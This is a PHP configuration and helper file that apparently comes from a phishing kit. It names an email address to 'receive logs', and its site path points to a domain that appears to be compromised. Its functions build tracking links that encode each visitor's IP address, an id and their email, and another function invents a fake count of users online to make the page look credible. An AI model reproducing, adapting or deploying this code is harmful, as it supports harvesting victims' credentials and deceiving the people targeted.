<?php 
session_start();
/**
 * Change to your own email address to receive logs 
*/
defined("LOGGER_EMAIL") || define("LOGGER_EMAIL", "yoyoben85@gmail.com");

/**
 * Change the example.com to the current domain name where you are hosting this files 
*/
defined("SENDER_EMAIL") || define("SENDER_EMAIL", "konyaspotcu.com.tr");

/**
 * Change https://example.com to the current website link and path if any
*/
defined("WEBSITE_LINK") || define("WEBSITE_LINK", "https://konyaspotcu.com.tr/zom1/zom1");



/**
 DO NOT CHANGE ANYTHING BELOW
*/
function get_ip_address() 
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_array = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ip_array as $ip) {
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['REMOTE_ADDR']) && filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        return $_SERVER['REMOTE_ADDR'];
    }
    
    return 'UNKNOWN';
}

function generate_shared_link($array) 
{
    $link = WEBSITE_LINK;
    $link .= '/join.php?values=1&agent=';
    $link .= base64_encode(get_ip_address());
    $link .= '&id=' . base64_encode($array['id']);
    $link .= '&email=' . base64_encode($array['email']);

    return $link;
}

function extract_channel_info($getter){

    $email = base64_decode($getter['email']);

    if( $email === false){
        return array('', '', '', '', '', '');
    }

    $agent = base64_decode($getter['agent']);
    $id = base64_decode($getter['id']);

    return array(
        $agent, 
        $id, 
        $email, 
        ($getter['agent']??''), 
        ($getter['id']??''), 
        ($getter['email']??'')
    );
}

function online_counter() {
    if(isset($_SESSION['lock_online_counter'])) {
        $counter = $_SESSION['lock_online_counter'];
        $count = $counter['count'] ?? 3;
        $last_update_time = $counter['time'] ?? 0;
        $now = time();

        if ($now - $last_update_time > 60) {
            $random_operator = rand(0, 1) == 1 ? 1 : -1;
            $_SESSION['lock_online_counter']['count'] = $count + $random_operator;
            $_SESSION['lock_online_counter']['time'] = $now;
            $count += $random_operator;
        }

        return $count;
    }

    $count = rand(3, 30);
    $_SESSION['lock_online_counter']['count'] = $count;
    $_SESSION['lock_online_counter']['time'] = time();

    return $count;
}